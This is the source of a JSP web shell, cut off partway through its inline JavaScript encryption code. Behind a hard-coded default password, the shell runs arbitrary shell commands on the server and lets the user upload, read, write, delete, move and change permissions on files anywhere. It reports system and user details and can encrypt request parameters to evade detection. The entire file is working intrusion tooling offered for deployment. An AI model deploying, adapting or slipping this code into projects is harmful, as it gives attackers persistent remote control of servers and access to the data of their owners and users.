<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.nio.file.attribute.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.util.zip.*" %>
<%@ page import="java.text.*" %>
<%@ page import="java.security.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="javax.crypto.*" %>
<%@ page import="javax.crypto.spec.*" %>
<%!
// ============================================================================
// CONFIGURATION SECTION - Modify these settings as needed
// ============================================================================

private static final String AUTH_PASSWORD_HASH = "7fcf4ba391c48784edde599889d6e3f1e47a27db36ecc050cc92f259bfac38afad2c68a1ae804d77075e8fb722503f3eca2b2c1006ee6f6c7b7628cb45fffd1d"; // admin123 (sha512)
private static final String AUTH_COOKIE_NAME = "SM_AUTH";
private static final int AUTH_COOKIE_EXPIRY_DAYS = 7;
private static final int MAX_UPLOAD_SIZE = 100 * 1024 * 1024;

private static final boolean PARAM_ENCRYPTION_ENABLED = false;
private static final String ENCRYPTION_KEY = "MySecretKey12345";
private static final String ENCRYPTION_ALGORITHM = "AES"; // AES, DES, RC2, RC4, RSA, etc.
private static final String ENCRYPTION_ENCODING = "base64"; // base64, base32, hex

// ============================================================================
// UTILITY METHODS
// ============================================================================

private String hashPassword(String password) {
    try {
        MessageDigest md = MessageDigest.getInstance("SHA-512");
        byte[] hash = md.digest(password.getBytes("UTF-8"));
        StringBuilder hexString = new StringBuilder();
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    } catch (Exception e) {
        return null;
    }
}

private boolean isAuthEnabled() {
    return AUTH_PASSWORD_HASH != null && !AUTH_PASSWORD_HASH.trim().isEmpty();
}

private String getAuthToken(String password) {
    return hashPassword(password + AUTH_COOKIE_NAME);
}

private boolean isAuthenticated(HttpServletRequest request) {
    if (!isAuthEnabled()) return true;
    
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if (AUTH_COOKIE_NAME.equals(cookie.getName())) {
                String expectedToken = getAuthToken("");
                return cookie.getValue().equals(hashPassword(AUTH_PASSWORD_HASH + AUTH_COOKIE_NAME));
            }
        }
    }
    return false;
}

private void setAuthCookie(HttpServletResponse response, String password) {
    String token = hashPassword(AUTH_PASSWORD_HASH + AUTH_COOKIE_NAME);
    Cookie cookie = new Cookie(AUTH_COOKIE_NAME, token);
    cookie.setMaxAge(AUTH_COOKIE_EXPIRY_DAYS * 24 * 60 * 60);
    cookie.setPath("/");
    cookie.setHttpOnly(true);
    response.addCookie(cookie);
}

private void clearAuthCookie(HttpServletResponse response) {
    Cookie cookie = new Cookie(AUTH_COOKIE_NAME, "");
    cookie.setMaxAge(0);
    cookie.setPath("/");
    response.addCookie(cookie);
}

private int indexOf(byte[] data, byte[] pattern, int start) {
    if (pattern.length == 0) return start;
    for (int i = start; i <= data.length - pattern.length; i++) {
        boolean found = true;
        for (int j = 0; j < pattern.length; j++) {
            if (data[i + j] != pattern[j]) {
                found = false;
                break;
            }
        }
        if (found) return i;
    }
    return -1;
}

private String escapeHtml(String text) {
    if (text == null) return "";
    return text.replace("&", "&amp;")
               .replace("<", "&lt;")
               .replace(">", "&gt;")
               .replace("\"", "&quot;")
               .replace("'", "&#39;");
}

private byte[] deriveKey(String password, int keySize) throws Exception {
    MessageDigest sha = MessageDigest.getInstance("SHA-256");
    byte[] key = sha.digest(password.getBytes("UTF-8"));
    byte[] derivedKey = new byte[keySize];
    System.arraycopy(key, 0, derivedKey, 0, Math.min(keySize, key.length));
    return derivedKey;
}

private String encodeBytes(byte[] data, String encoding) {
    if ("base32".equalsIgnoreCase(encoding)) {
        String base32Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        StringBuilder result = new StringBuilder();
        int buffer = 0;
        int bitsLeft = 0;
        for (byte b : data) {
            buffer = (buffer << 8) | (b & 0xFF);
            bitsLeft += 8;
            while (bitsLeft >= 5) {
                result.append(base32Chars.charAt((buffer >> (bitsLeft - 5)) & 0x1F));
                bitsLeft -= 5;
            }
        }
        if (bitsLeft > 0) {
            result.append(base32Chars.charAt((buffer << (5 - bitsLeft)) & 0x1F));
        }
        while (result.length() % 8 != 0) {
            result.append('=');
        }
        return result.toString();
    } else if ("hex".equalsIgnoreCase(encoding)) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : data) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    } else {
        return Base64.getEncoder().encodeToString(data);
    }
}

private byte[] decodeBytes(String encoded, String encoding) {
    if ("base32".equalsIgnoreCase(encoding)) {
        String base32Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        encoded = encoded.replaceAll("=", "");
        ByteArrayOutputStream result = new ByteArrayOutputStream();
        int buffer = 0;
        int bitsLeft = 0;
        for (char c : encoded.toCharArray()) {
            int value = base32Chars.indexOf(c);
            if (value < 0) continue;
            buffer = (buffer << 5) | value;
            bitsLeft += 5;
            if (bitsLeft >= 8) {
                result.write((buffer >> (bitsLeft - 8)) & 0xFF);
                bitsLeft -= 8;
            }
        }
        return result.toByteArray();
    } else if ("hex".equalsIgnoreCase(encoding)) {
        int len = encoded.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(encoded.charAt(i), 16) << 4)
                                 + Character.digit(encoded.charAt(i+1), 16));
        }
        return data;
    } else {
        return Base64.getDecoder().decode(encoded);
    }
}

private String encryptAES(String plaintext) throws Exception {
    byte[] keyBytes = deriveKey(ENCRYPTION_KEY, 16);
    SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    byte[] iv = new byte[16];
    SecureRandom random = new SecureRandom();
    random.nextBytes(iv);
    IvParameterSpec ivSpec = new IvParameterSpec(iv);
    cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
    byte[] encrypted = cipher.doFinal(plaintext.getBytes("UTF-8"));
    byte[] combined = new byte[iv.length + encrypted.length];
    System.arraycopy(iv, 0, combined, 0, iv.length);
    System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
    return encodeBytes(combined, ENCRYPTION_ENCODING);
}

private String decryptAES(String ciphertext) throws Exception {
    byte[] keyBytes = deriveKey(ENCRYPTION_KEY, 16);
    SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
    byte[] combined = decodeBytes(ciphertext, ENCRYPTION_ENCODING);
    byte[] iv = new byte[16];
    System.arraycopy(combined, 0, iv, 0, 16);
    IvParameterSpec ivSpec = new IvParameterSpec(iv);
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);
    byte[] decrypted = cipher.doFinal(combined, 16, combined.length - 16);
    return new String(decrypted, "UTF-8");
}

private String getEncryptedParam(HttpServletRequest request, String paramName) {
    if (!PARAM_ENCRYPTION_ENABLED) {
        return request.getParameter(paramName);
    }
    try {
        Enumeration<String> paramNames = request.getParameterNames();
        while (paramNames.hasMoreElements()) {
            String encryptedName = paramNames.nextElement();
            try {
                String decryptedName = decryptAES(encryptedName);
                if (paramName.equals(decryptedName)) {
                    String encryptedValue = request.getParameter(encryptedName);
                    return decryptAES(encryptedValue);
                }
            } catch (Exception e) {
            }
        }
    } catch (Exception e) {
    }
    return null;
}

private String formatBytes(long bytes) {
    if (bytes < 1024) return bytes + " B";
    int exp = (int) (Math.log(bytes) / Math.log(1024));
    String pre = "KMGTPE".charAt(exp-1) + "i";
    return String.format("%.2f %sB", bytes / Math.pow(1024, exp), pre);
}

private String formatFilePermissions(File file) {
    StringBuilder sb = new StringBuilder();
    sb.append(file.isDirectory() ? "d" : "-");
    sb.append(file.canRead() ? "r" : "-");
    sb.append(file.canWrite() ? "w" : "-");
    sb.append(file.canExecute() ? "x" : "-");
    return sb.toString();
}

private String getPosixPermissions(Path path) {
    try {
        Set<PosixFilePermission> perms = Files.getPosixFilePermissions(path);
        StringBuilder sb = new StringBuilder();
        sb.append(Files.isDirectory(path) ? "d" : "-");
        sb.append(perms.contains(PosixFilePermission.OWNER_READ) ? "r" : "-");
        sb.append(perms.contains(PosixFilePermission.OWNER_WRITE) ? "w" : "-");
        sb.append(perms.contains(PosixFilePermission.OWNER_EXECUTE) ? "x" : "-");
        sb.append(perms.contains(PosixFilePermission.GROUP_READ) ? "r" : "-");
        sb.append(perms.contains(PosixFilePermission.GROUP_WRITE) ? "w" : "-");
        sb.append(perms.contains(PosixFilePermission.GROUP_EXECUTE) ? "x" : "-");
        sb.append(perms.contains(PosixFilePermission.OTHERS_READ) ? "r" : "-");
        sb.append(perms.contains(PosixFilePermission.OTHERS_WRITE) ? "w" : "-");
        sb.append(perms.contains(PosixFilePermission.OTHERS_EXECUTE) ? "x" : "-");
        return sb.toString();
    } catch (Exception e) {
        return formatFilePermissions(path.toFile());
    }
}

private String getFileOwner(Path path) {
    try {
        String owner = Files.getOwner(path).getName();
        String group = "-";
        try {
            PosixFileAttributes attrs = Files.readAttributes(path, PosixFileAttributes.class);
            group = attrs.group().getName();
        } catch (Exception e) {
        }
        return owner + "/" + group;
    } catch (Exception e) {
        return "-/-";
    }
}

private String getFileExtension(String fileName) {
    int lastDot = fileName.lastIndexOf('.');
    if (lastDot > 0 && lastDot < fileName.length() - 1) {
        return fileName.substring(lastDot + 1);
    }
    return "-";
}

private Map<String, Object> getSystemInfo() {
    Map<String, Object> info = new LinkedHashMap<>();
    
    info.put("OS Name", System.getProperty("os.name"));
    info.put("OS Version", System.getProperty("os.version"));
    info.put("OS Arch", System.getProperty("os.arch"));
    info.put("Java Version", System.getProperty("java.version"));
    info.put("Java Vendor", System.getProperty("java.vendor"));
    info.put("Java Home", System.getProperty("java.home"));
    
    Runtime runtime = Runtime.getRuntime();
    info.put("CPU Cores", runtime.availableProcessors());
    info.put("Max Memory", formatBytes(runtime.maxMemory()));
    info.put("Total Memory", formatBytes(runtime.totalMemory()));
    info.put("Free Memory", formatBytes(runtime.freeMemory()));
    info.put("Used Memory", formatBytes(runtime.totalMemory() - runtime.freeMemory()));
    
    File[] roots = File.listRoots();
    for (int i = 0; i < roots.length; i++) {
        File root = roots[i];
        info.put("Disk " + root.getAbsolutePath() + " Total", formatBytes(root.getTotalSpace()));
        info.put("Disk " + root.getAbsolutePath() + " Free", formatBytes(root.getFreeSpace()));
        info.put("Disk " + root.getAbsolutePath() + " Used", formatBytes(root.getTotalSpace() - root.getFreeSpace()));
    }
    
    info.put("User Name", System.getProperty("user.name"));
    info.put("User Home", System.getProperty("user.home"));
    info.put("User Dir", System.getProperty("user.dir"));
    info.put("Current Date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z").format(new Date()));
    
    return info;
}

private String executeCommand(String command) {
    StringBuilder output = new StringBuilder();
    Process process = null;
    BufferedReader reader = null;
    BufferedReader errorReader = null;
    
    try {
        String os = System.getProperty("os.name").toLowerCase();
        String[] cmd;
        
        if (os.contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", command};
        } else {
            cmd = new String[]{"/bin/sh", "-c", command};
        }
        
        process = Runtime.getRuntime().exec(cmd);
        
        reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        
        while ((line = errorReader.readLine()) != null) {
            output.append("[ERROR] ").append(line).append("\n");
        }
        
        int exitCode = process.waitFor();
        output.append("\n[Exit Code: ").append(exitCode).append("]");
        
    } catch (Exception e) {
        output.append("[Exception] ").append(e.getMessage());
    } finally {
        try {
            if (reader != null) reader.close();
            if (errorReader != null) errorReader.close();
            if (process != null) process.destroy();
        } catch (IOException e) {
        }
    }
    
    return output.toString();
}

private List<File> listFiles(String path) {
    File dir = new File(path);
    File[] files = dir.listFiles();
    List<File> fileList = new ArrayList<>();
    
    if (files != null) {
        Arrays.sort(files, new Comparator<File>() {
            public int compare(File f1, File f2) {
                if (f1.isDirectory() && !f2.isDirectory()) return -1;
                if (!f1.isDirectory() && f2.isDirectory()) return 1;
                return f1.getName().compareToIgnoreCase(f2.getName());
            }
        });
        fileList.addAll(Arrays.asList(files));
    }
    
    return fileList;
}

private String readFileContent(String path, int maxLines) {
    StringBuilder content = new StringBuilder();
    BufferedReader reader = null;
    
    try {
        File file = new File(path);
        if (!file.exists() || !file.isFile()) {
            return "[Error: File does not exist or is not a regular file]";
        }
        
        if (file.length() > 10 * 1024 * 1024) {
            return "[Error: File too large to display (> 10MB)]";
        }
        
        reader = new BufferedReader(new FileReader(file));
        String line;
        int lineCount = 0;
        
        while ((line = reader.readLine()) != null && lineCount < maxLines) {
            content.append(line).append("\n");
            lineCount++;
        }
        
        if (reader.readLine() != null) {
            content.append("\n[... Truncated at ").append(maxLines).append(" lines ...]");
        }
        
    } catch (Exception e) {
        content.append("[Exception] ").append(e.getMessage());
    } finally {
        try {
            if (reader != null) reader.close();
        } catch (IOException e) {
        }
    }
    
    return content.toString();
}

private byte[] decompressGzip(byte[] compressed) throws IOException {
    ByteArrayInputStream bis = new ByteArrayInputStream(compressed);
    GZIPInputStream gis = new GZIPInputStream(bis);
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    
    byte[] buffer = new byte[1024];
    int len;
    while ((len = gis.read(buffer)) > 0) {
        bos.write(buffer, 0, len);
    }
    
    gis.close();
    bos.close();
    
    return bos.toByteArray();
}

private Map<String, String> parseFormData(HttpServletRequest request) throws Exception {
    Map<String, String> formData = new HashMap<>();
    
    String contentType = request.getContentType();
    boolean isCompressed = "gzip".equalsIgnoreCase(request.getHeader("Content-Encoding"));
    
    InputStream inputStream = request.getInputStream();
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    byte[] data = new byte[1024];
    int nRead;
    
    while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
        buffer.write(data, 0, nRead);
    }
    
    byte[] bodyBytes = buffer.toByteArray();
    
    if (isCompressed) {
        bodyBytes = decompressGzip(bodyBytes);
    }
    
    String body = new String(bodyBytes, "UTF-8");
    
    if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
        String[] pairs = body.split("&");
        for (String pair : pairs) {
            int idx = pair.indexOf("=");
            if (idx > 0) {
                String key = java.net.URLDecoder.decode(pair.substring(0, idx), "UTF-8");
                String value = java.net.URLDecoder.decode(pair.substring(idx + 1), "UTF-8");
                formData.put(key, value);
            }
        }
    }
    
    return formData;
}
%>
<%
String message = "";
String messageType = "info";
String currentPath = getEncryptedParam(request, "path");
if (currentPath == null || currentPath.isEmpty()) {
    currentPath = System.getProperty("user.home");
}

String action = null;
String activeTab = null;

String contentType = request.getContentType();
boolean isMultipart = contentType != null && contentType.toLowerCase().startsWith("multipart/form-data");

if (isMultipart && "POST".equalsIgnoreCase(request.getMethod())) {
    try {
        String boundary = contentType.substring(contentType.indexOf("boundary=") + 9);
        
        InputStream is = request.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = is.read(buffer)) != -1) {
            baos.write(buffer, 0, bytesRead);
        }
        byte[] data = baos.toByteArray();
        
        String boundaryStr = "--" + boundary;
        int boundaryLen = boundaryStr.length();
        
        String uploadPath = currentPath;
        String uploadedFileName = null;
        
        int pos = 0;
        while (pos < data.length) {
            int boundaryPos = indexOf(data, boundaryStr.getBytes("ISO-8859-1"), pos);
            if (boundaryPos == -1) break;
            
            pos = boundaryPos + boundaryLen;
            if (pos + 2 >= data.length) break;
            if (data[pos] == '-' && data[pos + 1] == '-') break;
            
            pos += 2;
            
            int headerEnd = indexOf(data, "\r\n\r\n".getBytes("ISO-8859-1"), pos);
            if (headerEnd == -1) break;
            
            String headers = new String(data, pos, headerEnd - pos, "ISO-8859-1");
            pos = headerEnd + 4;
            
            int nextBoundary = indexOf(data, ("\r\n" + boundaryStr).getBytes("ISO-8859-1"), pos);
            if (nextBoundary == -1) break;
            
            if (headers.contains("filename=\"")) {
                int fnStart = headers.indexOf("filename=\"") + 10;
                int fnEnd = headers.indexOf("\"", fnStart);
                String filename = headers.substring(fnStart, fnEnd);
                
                if (!filename.isEmpty()) {
                    filename = filename.substring(filename.lastIndexOf("\\") + 1);
                    filename = filename.substring(filename.lastIndexOf("/") + 1);
                    
                    byte[] fileContent = new byte[nextBoundary - pos];
                    System.arraycopy(data, pos, fileContent, 0, nextBoundary - pos);
                    
                    File uploadFile = new File(uploadPath, filename);
                    FileOutputStream fos = null;
                    try {
                        fos = new FileOutputStream(uploadFile);
                        fos.write(fileContent);
                        uploadedFileName = filename;
                    } finally {
                        if (fos != null) fos.close();
                    }
                }
            } else if (headers.contains("name=\"")) {
                int nameStart = headers.indexOf("name=\"") + 6;
                int nameEnd = headers.indexOf("\"", nameStart);
                String fieldName = headers.substring(nameStart, nameEnd);
                String fieldValue = new String(data, pos, nextBoundary - pos, "UTF-8");
                
                if (PARAM_ENCRYPTION_ENABLED) {
                    try {
                        fieldName = decryptAES(fieldName);
                        fieldValue = decryptAES(fieldValue);
                    } catch (Exception e) {
                    }
                }
                
                if ("action".equals(fieldName)) {
                    action = fieldValue;
                } else if ("tab".equals(fieldName)) {
                    activeTab = fieldValue;
                } else if ("uploadpath".equals(fieldName)) {
                    uploadPath = fieldValue;
                } else if ("path".equals(fieldName)) {
                    currentPath = fieldValue;
                }
            }
            
            pos = nextBoundary + 2;
        }
        
        if (uploadedFileName != null) {
            message = "File uploaded: " + uploadedFileName;
            messageType = "success";
            if (activeTab == null) activeTab = "files";
        } else {
            message = "No file selected";
            messageType = "error";
        }
    } catch (Exception e) {
        message = "Upload failed: " + e.getMessage();
        messageType = "error";
    }
} else {
    action = getEncryptedParam(request, "action");
    activeTab = getEncryptedParam(request, "tab");
}

if (activeTab == null || activeTab.isEmpty()) {
    activeTab = "files";
}

List<String> consoleHistory = (List<String>) session.getAttribute("consoleHistory");
if (consoleHistory == null) {
    consoleHistory = new ArrayList<>();
    session.setAttribute("consoleHistory", consoleHistory);
}

if ("POST".equalsIgnoreCase(request.getMethod()) && !isMultipart) {
    
    if ("login".equals(action)) {
        String password = getEncryptedParam(request, "password");
        if (password != null && hashPassword(password).equals(AUTH_PASSWORD_HASH)) {
            setAuthCookie(response, password);
            response.sendRedirect(request.getRequestURI());
            return;
        } else {
            message = "Invalid password";
            messageType = "error";
        }
    }
    
    if (isAuthenticated(request)) {
        
        try {
            if ("execute".equals(action)) {
                String command = getEncryptedParam(request, "command");
                if (command != null && !command.trim().isEmpty()) {
                    String output = executeCommand(command);
                    consoleHistory.add("$ " + command);
                    consoleHistory.add(output);
                    session.setAttribute("consoleHistory", consoleHistory);
                    activeTab = "console";
                }
            } else if ("createDir".equals(action)) {
                String dirName = getEncryptedParam(request, "dirname");
                if (dirName != null && !dirName.isEmpty()) {
                    File newDir = new File(currentPath, dirName);
                    if (newDir.mkdir()) {
                        message = "Directory created: " + dirName;
                        messageType = "success";
                    } else {
                        message = "Failed to create directory";
                        messageType = "error";
                    }
                }
            } else if ("createFile".equals(action)) {
                String fileName = getEncryptedParam(request, "filename");
                if (fileName != null && !fileName.isEmpty()) {
                    File newFile = new File(currentPath, fileName);
                    if (newFile.createNewFile()) {
                        message = "File created: " + fileName;
                        messageType = "success";
                    } else {
                        message = "Failed to create file";
                        messageType = "error";
                    }
                }
            } else if ("delete".equals(action)) {
                String filePath = getEncryptedParam(request, "filepath");
                if (filePath != null && !filePath.isEmpty()) {
                    File fileToDelete = new File(filePath);
                    if (fileToDelete.exists()) {
                        if (deleteRecursive(fileToDelete)) {
                            message = "Deleted: " + fileToDelete.getName();
                            messageType = "success";
                        } else {
                            message = "Failed to delete";
                            messageType = "error";
                        }
                    }
                }
            } else if ("read".equals(action)) {
                String filePath = getEncryptedParam(request, "filepath");
                if (filePath != null && !filePath.isEmpty()) {
                    message = readFileContent(filePath, 1000);
                    messageType = "file";
                }
            } else if ("chmod".equals(action)) {
                String filePath = getEncryptedParam(request, "filepath");
                String perms = getEncryptedParam(request, "permissions");
                if (filePath != null && perms != null) {
                    File file = new File(filePath);
                    if (setPermissions(file, perms)) {
                        message = "Permissions updated";
                        messageType = "success";
                    } else {
                        message = "Failed to update permissions";
                        messageType = "error";
                    }
                }
            } else if ("write".equals(action)) {
                String filePath = getEncryptedParam(request, "filepath");
                String content = getEncryptedParam(request, "content");
                if (filePath != null && content != null) {
                    File file = new File(filePath);
                    FileWriter writer = null;
                    try {
                        writer = new FileWriter(file);
                        writer.write(content);
                        message = "File saved: " + file.getName();
                        messageType = "success";
                    } catch (Exception e) {
                        message = "Failed to save file: " + e.getMessage();
                        messageType = "error";
                    } finally {
                        if (writer != null) writer.close();
                    }
                }
            } else if ("move".equals(action)) {
                String filePath = getEncryptedParam(request, "filepath");
                String newPath = getEncryptedParam(request, "newpath");
                if (filePath != null && newPath != null) {
                    File sourceFile = new File(filePath);
                    File destFile = new File(newPath);
                    try {
                        if (sourceFile.renameTo(destFile)) {
                            message = "File moved successfully";
                            messageType = "success";
                        } else {
                            message = "Failed to move file";
                            messageType = "error";
                        }
                    } catch (Exception e) {
                        message = "Failed to move file: " + e.getMessage();
                        messageType = "error";
                    }
                }
            } else if ("clearConsole".equals(action)) {
                consoleHistory.clear();
                session.setAttribute("consoleHistory", consoleHistory);
                activeTab = "console";
            } else if ("navigate".equals(action)) {
                String navPath = getEncryptedParam(request, "navpath");
                if (navPath != null) {
                    currentPath = navPath;
                }
            }
        } catch (Exception e) {
            message = "Error: " + e.getMessage();
            messageType = "error";
        }
    }
}

if ("logout".equals(action)) {
    clearAuthCookie(response);
    response.sendRedirect(request.getRequestURI());
    return;
}

if (!isAuthenticated(request)) {
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        :root {
            --bg-primary: #ffffff;
            --bg-secondary: #f5f5f5;
            --text-primary: #1a1a1a;
            --text-secondary: #666666;
            --border-color: #e0e0e0;
            --accent-color: #2c3e50;
            --error-bg: #fff5f5;
            --error-border: #fc8181;
            --error-text: #c53030;
        }
        [data-theme="dark"] {
            --bg-primary: #1a1a1a;
            --bg-secondary: #2d2d2d;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --border-color: #404040;
            --accent-color: #4a5568;
            --error-bg: #3a2020;
            --error-border: #e53e3e;
            --error-text: #fc8181;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif; background: var(--bg-secondary); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: var(--text-primary); transition: background 0.3s, color 0.3s; }
        .login-container { background: var(--bg-primary); padding: 40px; border: 1px solid var(--border-color); width: 100%; max-width: 380px; }
        .login-container h1 { text-align: center; margin-bottom: 30px; font-size: 20px; font-weight: 600; letter-spacing: -0.5px; }
        .login-form { display: flex; gap: 8px; align-items: center; }
        .login-form input { flex: 1; padding: 10px; border: 1px solid var(--border-color); background: var(--bg-primary); color: var(--text-primary); font-size: 14px; }
        .login-form input:focus { outline: none; border-color: var(--accent-color); }
        .login-form button { padding: 10px 20px; background: var(--accent-color); color: white; border: none; font-size: 16px; cursor: pointer; font-weight: 500; }
        .login-form button:hover { opacity: 0.9; }
        .error { background: var(--error-bg); border: 1px solid var(--error-border); color: var(--error-text); padding: 10px; margin-bottom: 20px; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1></h1>
        <% if (!message.isEmpty() && "error".equals(messageType)) { %>
        <div class="error"><%= escapeHtml(message) %></div>
        <% } %>
        <form method="POST" class="login-form">
            <input type="hidden" name="action" value="login">
            <input type="password" id="password" name="password" required autofocus placeholder="Password">
            <button type="submit">→</button>
        </form>
    </div>
    <script>
        var theme = localStorage.getItem('theme') || 'light';
        document.documentElement.setAttribute('data-theme', theme);
        
        var PARAM_ENCRYPTION_ENABLED = <%= PARAM_ENCRYPTION_ENABLED %>;
        var ENCRYPTION_KEY = localStorage.getItem('encryptionKey') || '<%= ENCRYPTION_KEY %>';
        var ENCRYPTION_ENCODING = '<%= ENCRYPTION_ENCODING %>';
        
        localStorage.setItem('encryptionKey', ENCRYPTION_KEY);
        
        function sha256(str) {
            function rightRotate(value, amount) {
                return (value >>> amount) | (value << (32 - amount));
            }
            var mathPow = Math.pow;
            var maxWord = mathPow(2, 32);
            var i, j;
            var result = '';
            var words = [];
            var asciiBitLength = str.length * 8;
            var hash = [];
            var k = [];
            var primeCounter = 0;
            var isComposite = {};
            for (var candidate = 2; primeCounter < 64; candidate++) {
                if (!isComposite[candidate]) {
                    for (i = 0; i < 313; i += candidate) {
                        isComposite[i] = candidate;
                    }
                    hash[primeCounter] = (mathPow(candidate, 0.5) * maxWord) | 0;
                    k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;
                }
            }
            str += '\x80';
            while (str.length % 64 - 56) str += '\x00';
            for (i = 0; i < str.length; i++) {
                j = str.charCodeAt(i);
                if (j >> 8) return;
                words[i >> 2] |= j << ((3 - i) % 4) * 8;
            }
            words[words.length] = ((asciiBitLength / maxWord) | 0);
            words[words.length] = (asciiBitLength);
            for (j = 0; j < words.length;) {
                var w = words.slice(j, j += 16);
                var oldHash = hash;
                hash = hash.slice(0, 8);
                for (i = 0; i < 64; i++) {
                    var w15 = w[i - 15], w2 = w[i - 2];
                    var a = hash[0], e = hash[4];
                    var temp1 = hash[7]
                        + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25))
                        + ((e & hash[5]) ^ ((~e) & hash[6]))
                        + k[i]
                        + (w[i] = (i < 16) ? w[i] : (
                                w[i - 16]
                                + (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15 >>> 3))
                                + w[i - 7]
                                + (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2 >>> 10))
                            ) | 0
                        );
                    var temp2 = (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22))
                        + ((a & hash[1]) ^ (a & hash[2]) ^ (hash[1] & hash[2]));
                    hash = [(temp1 + temp2) | 0].concat(hash);
                    hash[4] = (hash[4] + temp1) | 0;
                }
                for (i = 0; i < 8; i++) {
                    hash[i] = (hash[i] + oldHash[i]) | 0;
                }
            }
            for (i = 0; i < 8; i++) {
                for (j = 3; j + 1; j--) {
                    var b = (hash[i] >> (j * 8)) & 255;
                    result += ((b < 16) ? 0 : '') + b.toString(16);
                }
            }
            return result;
        }
        
        function deriveKey(password) {
            var hash = sha256(password);
            var key = [];
            for (var i = 0; i < 32; i += 2) {
                key.push(parseInt(hash.substr(i, 2), 16));
            }
            return key.slice(0, 16);
        }
        
        function aesEncrypt(key, iv, plaintext) {
            var sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
            var rcon = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
            function addRoundKey(state, roundKey) {
                for (var i = 0; i < 16; i++) state[i] ^= roundKey[i];
            }
            function subBytes(state) {
                for (var i = 0; i < 16; i++) state[i] = sbox[state[i]];
            }
